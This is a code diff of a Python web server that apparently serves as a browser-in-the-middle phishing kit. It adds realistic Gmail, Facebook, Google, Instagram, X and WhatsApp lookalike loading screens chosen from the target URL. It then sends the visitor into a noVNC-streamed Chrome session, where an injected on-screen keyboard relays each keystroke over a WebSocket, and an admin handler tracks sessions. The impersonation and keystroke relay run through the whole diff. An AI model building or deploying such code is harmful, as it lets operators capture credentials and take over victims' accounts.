@@ -458,9 +458,10 @@ ROUTER_HTML = """
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Arial, sans-serif;
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
             transition: background 0.3s;
@@ -471,49 +472,177 @@ ROUTER_HTML = """
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             color: #fff;
         }
+        .theme-generic .spinner { border-top-color: #0a84ff; }
 
-        /* Theme: Gmail */
+        /* Theme: Gmail - Realistic */
         body.theme-gmail {
-            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+            background: #fff;
             color: #202124;
         }
-        .theme-gmail .spinner { border-top-color: #ea4335; }
-        .theme-gmail .logo { color: #ea4335; }
-
-        /* Theme: Facebook */
-        body.theme-facebook {
-            background: linear-gradient(135deg, #1877f2 0%, #0d5bbd 100%);
-            color: #fff;
+        .theme-gmail .loader {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
         }
-        .theme-facebook .spinner { border-top-color: #fff; border-color: rgba(255,255,255,0.2); }
+        .theme-gmail .logo {
+            font-size: 48px;
+            margin-bottom: 0;
+        }
+        .theme-gmail .gmail-logo {
+            width: 74px;
+            height: 74px;
+            margin-bottom: 20px;
+        }
+        .theme-gmail .spinner {
+            display: none;
+        }
+        .theme-gmail .gmail-spinner {
+            display: block;
+            width: 40px;
+            height: 40px;
+            margin: 20px auto;
+        }
+        .theme-gmail .gmail-spinner svg {
+            animation: gmail-rotate 1.4s linear infinite;
+        }
+        .theme-gmail .gmail-spinner circle {
+            stroke: #1a73e8;
+            stroke-dasharray: 80, 200;
+            stroke-dashoffset: 0;
+            animation: gmail-dash 1.4s ease-in-out infinite;
+            stroke-linecap: round;
+        }
+        @keyframes gmail-rotate {
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes gmail-dash {
+            0% { stroke-dasharray: 1, 200; stroke-dashoffset: 0; }
+            50% { stroke-dasharray: 89, 200; stroke-dashoffset: -35; }
+            100% { stroke-dasharray: 89, 200; stroke-dashoffset: -124; }
+        }
+        .theme-gmail h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        .theme-gmail p {
+            font-size: 14px;
+            color: #5f6368;
+        }
 
-        /* Theme: Google */
+        /* Theme: Facebook - Realistic */
+        body.theme-facebook {
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+        .theme-facebook .loader {
+            background: #fff;
+            padding: 40px 60px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .theme-facebook .logo {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: 700;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+        .theme-facebook .spinner { border-top-color: #1877f2; }
+        .theme-facebook h1 { color: #1c1e21; font-size: 16px; }
+        .theme-facebook p { color: #65676b; }
+
+        /* Theme: Google - Realistic */
         body.theme-google {
             background: #fff;
             color: #202124;
         }
-        .theme-google .spinner { border-top-color: #4285f4; }
-
-        /* Theme: Instagram */
-        body.theme-instagram {
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            color: #fff;
+        .theme-google .google-dots {
+            display: flex;
+            gap: 8px;
+            margin: 20px 0;
         }
-        .theme-instagram .spinner { border-top-color: #fff; border-color: rgba(255,255,255,0.2); }
+        .theme-google .google-dots span {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            animation: google-bounce 1.4s ease-in-out infinite;
+        }
+        .theme-google .google-dots span:nth-child(1) { background: #4285f4; animation-delay: 0s; }
+        .theme-google .google-dots span:nth-child(2) { background: #ea4335; animation-delay: 0.2s; }
+        .theme-google .google-dots span:nth-child(3) { background: #fbbc05; animation-delay: 0.4s; }
+        .theme-google .google-dots span:nth-child(4) { background: #34a853; animation-delay: 0.6s; }
+        @keyframes google-bounce {
+            0%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+        }
+        .theme-google .spinner { display: none; }
 
-        /* Theme: Twitter/X */
+        /* Theme: Instagram - Realistic */
+        body.theme-instagram {
+            background: #fafafa;
+            color: #262626;
+        }
+        .theme-instagram .logo {
+            font-size: 0;
+        }
+        .theme-instagram .instagram-logo {
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+        .theme-instagram .spinner { border-top-color: #c13584; }
+
+        /* Theme: Twitter/X - Realistic */
         body.theme-twitter {
             background: #000;
-            color: #fff;
+            color: #e7e9ea;
         }
-        .theme-twitter .spinner { border-top-color: #1d9bf0; }
+        .theme-twitter .logo {
+            font-size: 72px;
+            font-weight: 800;
+            margin-bottom: 20px;
+        }
+        .theme-twitter .spinner { border-top-color: #1d9bf0; border-color: rgba(255,255,255,0.2); }
+        .theme-twitter h1, .theme-twitter p { color: #e7e9ea; }
 
-        /* Theme: WhatsApp */
+        /* Theme: WhatsApp - Realistic */
         body.theme-whatsapp {
-            background: linear-gradient(135deg, #128c7e 0%, #075e54 100%);
-            color: #fff;
+            background: #111b21;
+            color: #e9edef;
         }
-        .theme-whatsapp .spinner { border-top-color: #25d366; border-color: rgba(255,255,255,0.2); }
+        .theme-whatsapp .logo { font-size: 0; }
+        .theme-whatsapp .whatsapp-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 30px;
+        }
+        .theme-whatsapp .spinner { border-top-color: #00a884; border-color: rgba(255,255,255,0.1); }
+        .theme-whatsapp h1 { color: #e9edef; font-size: 16px; font-weight: 400; }
+        .theme-whatsapp p { color: #8696a0; }
+        .theme-whatsapp .whatsapp-progress {
+            width: 200px;
+            height: 3px;
+            background: #2a3942;
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .theme-whatsapp .whatsapp-progress-bar {
+            height: 100%;
+            background: #00a884;
+            width: 0%;
+            animation: whatsapp-load 3s ease-in-out forwards;
+        }
+        @keyframes whatsapp-load {
+            0% { width: 0%; }
+            30% { width: 30%; }
+            60% { width: 60%; }
+            100% { width: 90%; }
+        }
 
         .loader {
             text-align: center;
@@ -526,13 +655,13 @@ ROUTER_HTML = """
         }
 
         .spinner {
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             border: 3px solid rgba(0,0,0,0.1);
             border-top-color: #0a84ff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 20px auto;
         }
 
         @keyframes spin {
@@ -540,9 +669,9 @@ ROUTER_HTML = """
         }
 
         h1 {
-            font-size: 20px;
-            font-weight: 500;
-            margin-bottom: 10px;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 8px;
         }
 
         p {
@@ -551,161 +680,212 @@ ROUTER_HTML = """
         }
 
         .error {
-            color: #ff453a;
+            color: #d93025;
             margin-top: 20px;
             opacity: 1;
         }
 
-        /* Logo images */
-        .logo-img {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 20px;
-        }
+        .hidden { display: none; }
     </style>
 </head>
 <body class="theme-generic">
-    <div class="loader">
+    <div class="loader" id="loader">
+        <!-- Gmail Logo SVG -->
+        <svg class="gmail-logo hidden" viewBox="0 0 74 74" xmlns="http://www.w3.org/2000/svg">
+            <path d="M37 74C57.4345 74 74 57.4345 74 37C74 16.5655 57.4345 0 37 0C16.5655 0 0 16.5655 0 37C0 57.4345 16.5655 74 37 74Z" fill="#F2F2F2"/>
+            <path d="M20.5 23H53.5C55.15 23 56.5 24.35 56.5 26V48C56.5 49.65 55.15 51 53.5 51H20.5C18.85 51 17.5 49.65 17.5 48V26C17.5 24.35 18.85 23 20.5 23Z" fill="#EA4335"/>
+            <path d="M56.5 26L37 39L17.5 26V48C17.5 49.65 18.85 51 20.5 51H53.5C55.15 51 56.5 49.65 56.5 48V26Z" fill="#FBBC05"/>
+            <path d="M17.5 26L37 39L56.5 26V48L37 35L17.5 48V26Z" fill="#34A853"/>
+            <path d="M17.5 26V28L37 41L56.5 28V26C56.5 24.35 55.15 23 53.5 23H20.5C18.85 23 17.5 24.35 17.5 26Z" fill="#C5221F"/>
+            <path d="M53.5 23H51V48C51 49.65 52.35 51 54 51H53.5C55.15 51 56.5 49.65 56.5 48V26C56.5 24.35 55.15 23 53.5 23Z" fill="#1A73E8"/>
+        </svg>
+
+        <!-- Gmail Spinner -->
+        <div class="gmail-spinner hidden">
+            <svg viewBox="0 0 50 50">
+                <circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle>
+            </svg>
+        </div>
+
+        <!-- WhatsApp Logo SVG -->
+        <svg class="whatsapp-logo hidden" viewBox="0 0 80 80" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="40" cy="40" r="40" fill="#25D366"/>
+            <path d="M56.5 23.5C52.4 19.4 46.8 17 40.8 17C28.3 17 18 27.3 18 39.8C18 43.8 19 47.7 21 51.1L17.8 63L30 59.9C33.3 61.7 37 62.6 40.8 62.6C53.3 62.6 63.6 52.3 63.6 39.8C63.6 33.8 61.2 28.2 56.5 23.5ZM40.8 58.3C37.4 58.3 34.1 57.4 31.2 55.8L30.5 55.4L23.5 57.2L25.4 50.4L24.9 49.6C23.1 46.6 22.2 43.2 22.2 39.8C22.2 29.6 30.6 21.2 40.9 21.2C45.8 21.2 50.4 23.1 53.9 26.6C57.4 30.1 59.4 34.8 59.4 39.8C59.3 50.1 50.9 58.3 40.8 58.3ZM50.8 44.1C50.3 43.8 47.6 42.5 47.1 42.3C46.7 42.1 46.3 42 46 42.5C45.6 43 44.6 44.2 44.3 44.6C44 45 43.6 45 43.2 44.8C40.3 43.4 38.4 42.2 36.4 38.9C35.9 38 36.9 38.1 37.8 36.3C37.9 36 37.9 35.6 37.7 35.3C37.5 35 36.4 32.3 36 31.3C35.6 30.4 35.2 30.5 34.9 30.5C34.6 30.5 34.2 30.5 33.9 30.5C33.5 30.5 32.9 30.7 32.4 31.2C31.9 31.7 30.5 33 30.5 35.7C30.5 38.4 32.4 41 32.7 41.4C33 41.8 36.3 46.9 41.3 49.3C45.1 51 46.3 50.8 47.3 50.7C48.8 50.5 51 49.4 51.4 48.1C51.9 46.9 51.9 45.8 51.7 45.6C51.5 44.4 51.2 44.3 50.8 44.1Z" fill="white"/>
+        </svg>
+        
+        <div class="whatsapp-progress hidden">
+            <div class="whatsapp-progress-bar"></div>
+        </div>
+
+        <!-- Google Dots -->
+        <div class="google-dots hidden">
+            <span></span><span></span><span></span><span></span>
+        </div>
+
+        <!-- Instagram Logo -->
+        <div class="instagram-logo hidden"></div>
+
         <div class="logo" id="logo">🌐</div>
-        <div class="spinner"></div>
+        <div class="spinner" id="spinner"></div>
         <h1 id="title">Loading...</h1>
         <p id="subtitle">Please wait</p>
         <p id="error" class="error" style="display:none;"></p>
     </div>
 
     <script>
-        // Site themes configuration
         const themes = {
             gmail: {
                 theme: 'gmail',
-                logo: '✉️',
-                title: 'Please wait while we secure your account',
-                subtitle: 'Connecting to Gmail...'
+                title: 'Loading Gmail',
+                subtitle: 'This may take a few seconds',
+                setup: () => {
+                    document.querySelector('.gmail-logo').classList.remove('hidden');
+                    document.querySelector('.gmail-spinner').classList.remove('hidden');
+                    document.getElementById('logo').classList.add('hidden');
+                }
             },
             facebook: {
                 theme: 'facebook',
-                logo: 'f',
-                title: 'Please wait while we connect you',
-                subtitle: 'Loading Facebook...'
+                logo: 'facebook',
+                title: 'Logging in...',
+                subtitle: '',
+                setup: () => {
+                    document.getElementById('logo').textContent = 'facebook';
+                    document.getElementById('logo').style.fontFamily = '"Helvetica Neue", Helvetica, Arial, sans-serif';
+                }
             },
             google: {
                 theme: 'google',
-                logo: 'G',
-                title: 'Loading Google',
-                subtitle: 'Just a moment...'
+                title: '',
+                subtitle: '',
+                setup: () => {
+                    document.querySelector('.google-dots').classList.remove('hidden');
+                    document.getElementById('logo').innerHTML = '<span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>';
+                    document.getElementById('logo').style.fontSize = '48px';
+                    document.getElementById('logo').style.fontWeight = '500';
+                }
             },
             instagram: {
                 theme: 'instagram',
-                logo: '📷',
-                title: 'Please wait',
-                subtitle: 'Loading Instagram...'
+                title: 'Loading...',
+                subtitle: '',
+                setup: () => {
+                    document.querySelector('.instagram-logo').classList.remove('hidden');
+                    document.getElementById('logo').classList.add('hidden');
+                }
             },
             twitter: {
                 theme: 'twitter',
                 logo: '𝕏',
-                title: 'Loading',
-                subtitle: 'Connecting to X...'
+                title: '',
+                subtitle: ''
             },
             x: {
                 theme: 'twitter',
                 logo: '𝕏',
-                title: 'Loading',
-                subtitle: 'Connecting to X...'
+                title: '',
+                subtitle: ''
             },
             whatsapp: {
                 theme: 'whatsapp',
-                logo: '💬',
-                title: 'Please wait',
-                subtitle: 'Loading WhatsApp Web...'
+                title: 'WhatsApp',
+                subtitle: 'End-to-end encrypted',
+                setup: () => {
+                    document.querySelector('.whatsapp-logo').classList.remove('hidden');
+                    document.querySelector('.whatsapp-progress').classList.remove('hidden');
+                    document.getElementById('logo').classList.add('hidden');
+                    document.getElementById('spinner').classList.add('hidden');
+                }
             }
         };
 
         function detectSite(url) {
             if (!url) return null;
             url = url.toLowerCase();
-            
             if (url.includes('gmail') || url.includes('mail.google')) return 'gmail';
             if (url.includes('facebook') || url.includes('fb.com')) return 'facebook';
             if (url.includes('instagram')) return 'instagram';
             if (url.includes('twitter') || url.includes('x.com')) return 'twitter';
             if (url.includes('whatsapp') || url.includes('web.whatsapp')) return 'whatsapp';
             if (url.includes('google')) return 'google';
-            
             return null;
         }
 
         function applyTheme(url) {
             const site = detectSite(url);
-            
             if (site && themes[site]) {
                 const config = themes[site];
                 document.body.className = 'theme-' + config.theme;
-                document.getElementById('logo').textContent = config.logo;
-                document.getElementById('title').textContent = config.title;
-                document.getElementById('subtitle').textContent = config.subtitle;
+                if (config.logo) document.getElementById('logo').textContent = config.logo;
+                if (config.title) document.getElementById('title').textContent = config.title;
+                if (config.subtitle !== undefined) document.getElementById('subtitle').textContent = config.subtitle;
+                if (config.setup) config.setup();
             } else if (url) {
-                // Generic theme with site name
                 try {
                     const hostname = new URL(url).hostname.replace('www.', '');
                     document.getElementById('title').textContent = 'Loading ' + hostname;
                     document.getElementById('subtitle').textContent = 'Please wait...';
-                } catch(e) {
-                    document.getElementById('title').textContent = 'Loading...';
-                }
+                } catch(e) {}
             }
         }
 
         function getScreenSize() {
-            // Get actual screen dimensions
-            const width = window.screen.width;
-            const height = window.screen.height;
-            const pixelRatio = window.devicePixelRatio || 1;
-            
-            // Use available dimensions (excluding browser chrome)
-            const availWidth = window.screen.availWidth;
-            const availHeight = window.screen.availHeight;
-            
-            // Use innerWidth/Height for actual viewport
-            const viewportWidth = window.innerWidth;
-            const viewportHeight = window.innerHeight;
-            
             return {
-                width: viewportWidth,
-                height: viewportHeight,
-                screenWidth: width,
-                screenHeight: height,
-                pixelRatio: pixelRatio,
+                width: window.innerWidth,
+                height: window.innerHeight,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                pixelRatio: window.devicePixelRatio || 1,
                 userAgent: navigator.userAgent
             };
         }
 
+        async function checkSessionReady(sessionId) {
+            // Poll until session is ready (Chrome loaded)
+            for (let i = 0; i < 30; i++) { // Max 30 seconds
+                try {
+                    const response = await fetch('/api/session/' + sessionId + '/status');
+                    const data = await response.json();
+                    if (data.ready) {
+                        return true;
+                    }
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, 1000));
+            }
+            return false;
+        }
+
         async function connect() {
             try {
-                // First get the configured URL from server
                 const configResponse = await fetch('/api/config');
                 const config = await configResponse.json();
                 
-                // Apply theme based on URL
                 if (config.url) {
                     applyTheme(config.url);
                 }
                 
-                // Get device screen size
                 const screenInfo = getScreenSize();
                 
-                // Now connect with screen info
                 const response = await fetch('/api/connect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        screen: screenInfo
-                    })
+                    body: JSON.stringify({ screen: screenInfo })
                 });
                 
                 const data = await response.json();
                 
                 if (data.success) {
-                    window.location.href = data.redirect_url;
+                    // Wait for session to be ready
+                    document.getElementById('subtitle').textContent = 'Almost there...';
+                    
+                    const ready = await checkSessionReady(data.session_id);
+                    
+                    if (ready) {
+                        window.location.href = data.redirect_url;
+                    } else {
+                        // Redirect anyway after timeout
+                        window.location.href = data.redirect_url;
+                    }
                 } else {
                     document.getElementById('error').textContent = data.error || 'Failed to create session';
                     document.getElementById('error').style.display = 'block';
@@ -729,29 +909,241 @@ KEYBOARD_WRAPPER_HTML = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <title>noVNC Session</title>
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Session</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body { width: 100%; height: 100%; overflow: hidden; background: #000; }
-        #vnc-iframe { width: 100%; height: 100%; border: none; }
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box;
+        }
+        html, body { 
+            width: 100%; 
+            height: 100%; 
+            overflow: hidden; 
+            background: #000;
+            touch-action: manipulation;
+        }
+        #vnc-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+        }
+        #vnc-iframe { 
+            width: 100%; 
+            height: 100%; 
+            border: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
     </style>
 </head>
 <body>
-    <iframe id="vnc-iframe" src="SESSION_VNC_URL"></iframe>
+    <div id="vnc-container">
+        <iframe id="vnc-iframe" src="SESSION_VNC_URL" allow="fullscreen"></iframe>
+    </div>
+
     <script>
-        // Activity tracking
         const SESSION_ID = 'SESSION_ID_PLACEHOLDER';
         const AGENT_PORT = AGENT_PORT_PLACEHOLDER;
+        const AGENT_WS = 'ws://' + window.location.hostname + ':' + AGENT_PORT;
         
-        // Send activity ping every 30 seconds
+        // Activity tracking - ping every 30 seconds
         setInterval(() => {
-            fetch('/api/activity/' + SESSION_ID, { method: 'POST' });
+            fetch('/api/activity/' + SESSION_ID, { method: 'POST' }).catch(() => {});
         }, 30000);
         
-        // Load keyboard overlay script
-        const script = document.createElement('script');
-        script.src = '/keyboard.js?port=' + AGENT_PORT;
-        document.body.appendChild(script);
+        // Connect to keyboard agent WebSocket
+        let ws = null;
+        let keyboardVisible = false;
+        
+        function connectAgent() {
+            ws = new WebSocket(AGENT_WS);
+            
+            ws.onopen = () => {
+                console.log('Agent connected');
+            };
+            
+            ws.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    if (data.action === 'show_keyboard') {
+                        showKeyboard();
+                    } else if (data.action === 'hide_keyboard') {
+                        hideKeyboard();
+                    }
+                } catch(e) {}
+            };
+            
+            ws.onclose = () => {
+                console.log('Agent disconnected, reconnecting...');
+                setTimeout(connectAgent, 3000);
+            };
+            
+            ws.onerror = () => {
+                ws.close();
+            };
+        }
+        
+        function sendKey(type, key) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: type, key: key }));
+            }
+        }
+        
+        // Keyboard UI
+        const keyboardHTML = `
+        <div id="keyboard-overlay" style="
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #d1d3d9;
+            transform: translateY(100%);
+            transition: transform 0.25s ease;
+            z-index: 9999;
+            padding: 5px;
+            padding-bottom: max(5px, env(safe-area-inset-bottom));
+        ">
+            <div id="kb-rows"></div>
+        </div>
+        `;
+        
+        const layouts = {
+            letters: [
+                ['q','w','e','r','t','y','u','i','o','p'],
+                ['a','s','d','f','g','h','j','k','l'],
+                ['shift','z','x','c','v','b','n','m','⌫'],
+                ['123','🌐','space','return']
+            ],
+            numbers: [
+                ['1','2','3','4','5','6','7','8','9','0'],
+                ['-','/',':',';','(',')','$','&','@','"'],
+                ['#+=','.',',','?','!',\"'\",'⌫'],
+                ['ABC','🌐','space','return']
+            ]
+        };
+        
+        let currentLayout = 'letters';
+        let isShift = false;
+        let isCaps = false;
+        
+        function createKeyboard() {
+            document.body.insertAdjacentHTML('beforeend', keyboardHTML);
+            renderKeys();
+        }
+        
+        function renderKeys() {
+            const rows = document.getElementById('kb-rows');
+            const layout = layouts[currentLayout];
+            
+            rows.innerHTML = layout.map((row, ri) => {
+                return '<div style="display:flex;justify-content:center;margin-bottom:6px;">' +
+                    row.map(key => {
+                        let display = key;
+                        let width = 'calc((100% - 50px) / 10)';
+                        let bg = '#fff';
+                        
+                        if (key === 'shift') { display = '⇧'; width = '42px'; bg = isShift || isCaps ? '#fff' : '#adb3bc'; }
+                        else if (key === '⌫') { width = '42px'; bg = '#adb3bc'; }
+                        else if (key === '123' || key === 'ABC' || key === '#+=') { width = '42px'; bg = '#adb3bc'; }
+                        else if (key === '🌐') { width = '38px'; bg = '#adb3bc'; }
+                        else if (key === 'space') { display = 'space'; width = 'calc(100% - 200px)'; }
+                        else if (key === 'return') { display = 'return'; width = '80px'; bg = '#007aff'; }
+                        else if (ri === 1 && currentLayout === 'letters') { width = 'calc((100% - 40px) / 9)'; }
+                        else if (ri === 2 && currentLayout === 'letters' && key.length === 1) { width = 'calc((100% - 100px) / 7)'; }
+                        
+                        if ((isShift || isCaps) && key.length === 1 && /[a-z]/.test(key)) {
+                            display = key.toUpperCase();
+                        }
+                        
+                        const color = key === 'return' ? '#fff' : '#000';
+                        
+                        return '<button data-key="' + key + '" style="' +
+                            'width:' + width + ';height:42px;margin:0 2px;border:none;border-radius:5px;' +
+                            'background:' + bg + ';color:' + color + ';font-size:' + (key.length > 1 ? '14px' : '22px') + ';' +
+                            'box-shadow:0 1px 0 rgba(0,0,0,0.35);-webkit-tap-highlight-color:transparent;' +
+                        '">' + display + '</button>';
+                    }).join('') +
+                '</div>';
+            }).join('');
+            
+            // Add event listeners
+            rows.querySelectorAll('button').forEach(btn => {
+                btn.addEventListener('touchstart', (e) => {
+                    e.preventDefault();
+                    btn.style.transform = 'scale(0.95)';
+                    btn.style.opacity = '0.7';
+                });
+                btn.addEventListener('touchend', (e) => {
+                    e.preventDefault();
+                    btn.style.transform = '';
+                    btn.style.opacity = '';
+                    handleKey(btn.dataset.key);
+                });
+            });
+        }
+        
+        function handleKey(key) {
+            if (key === 'shift') {
+                if (isShift) { isCaps = true; isShift = false; }
+                else if (isCaps) { isCaps = false; }
+                else { isShift = true; }
+                renderKeys();
+            } else if (key === '123') {
+                currentLayout = 'numbers';
+                renderKeys();
+            } else if (key === 'ABC') {
+                currentLayout = 'letters';
+                renderKeys();
+            } else if (key === '#+=') {
+                // Could add symbols layout
+            } else if (key === '🌐') {
+                // Language switch
+            } else if (key === 'space') {
+                sendKey('special', 'space');
+            } else if (key === 'return') {
+                sendKey('special', 'Return');
+            } else if (key === '⌫') {
+                sendKey('special', 'BackSpace');
+            } else {
+                let char = key;
+                if ((isShift || isCaps) && /[a-z]/.test(key)) {
+                    char = key.toUpperCase();
+                }
+                sendKey('key', char);
+                if (isShift && !isCaps) {
+                    isShift = false;
+                    renderKeys();
+                }
+            }
+        }
+        
+        function showKeyboard() {
+            const kb = document.getElementById('keyboard-overlay');
+            if (kb) {
+                kb.style.transform = 'translateY(0)';
+                keyboardVisible = true;
+            }
+        }
+        
+        function hideKeyboard() {
+            const kb = document.getElementById('keyboard-overlay');
+            if (kb) {
+                kb.style.transform = 'translateY(100%)';
+                keyboardVisible = false;
+            }
+        }
+        
+        // Initialize
+        createKeyboard();
+        connectAgent();
+        
+        // Hide keyboard when tapping on VNC
+        document.getElementById('vnc-container').addEventListener('click', () => {
+            // Let agent decide based on focus
+        });
     </script>
 </body>
 </html>
@@ -803,6 +1195,25 @@ class AdminHandler(BaseHTTPRequestHandler):
             return forwarded.split(',')[0].strip()
         return self.client_address[0]
     
+    def check_session_ready(self, session):
+        """Check if Chrome has loaded in the session"""
+        import subprocess
+        try:
+            # Check if Chrome window exists and has a title (page loaded)
+            result = subprocess.run(
+                ['xdotool', 'search', '--name', '.'],
+                env={'DISPLAY': f':{session.vnc_display}'},
+                capture_output=True,
+                text=True,
+                timeout=2
+            )
+            # If we find windows, Chrome is probably ready
+            if result.stdout.strip():
+                return True
+        except:
+            pass
+        return False
+    
     def do_OPTIONS(self):
         self.send_response(200)
         self.send_header('Access-Control-Allow-Origin', '*')
@@ -832,6 +1243,18 @@ class AdminHandler(BaseHTTPRequestHandler):
                 'sessions': [s.to_dict() for s in sessions],
                 'stats': stats
             })
+        
+        elif path.startswith('/api/session/') and path.endswith('/status'):
+            # Check if session is ready
+            parts = path.split('/')
+            session_id = parts[3]
+            if session_id in manager.sessions:
+                session = manager.sessions[session_id]
+                # Check if Chrome window is visible (page loaded)
+                ready = self.check_session_ready(session)
+                self.send_json({'ready': ready, 'session_id': session_id})
+            else:
+                self.send_json({'ready': False, 'error': 'Session not found'})
         
         elif path.startswith('/session/'):
             # Serve session-specific keyboard page
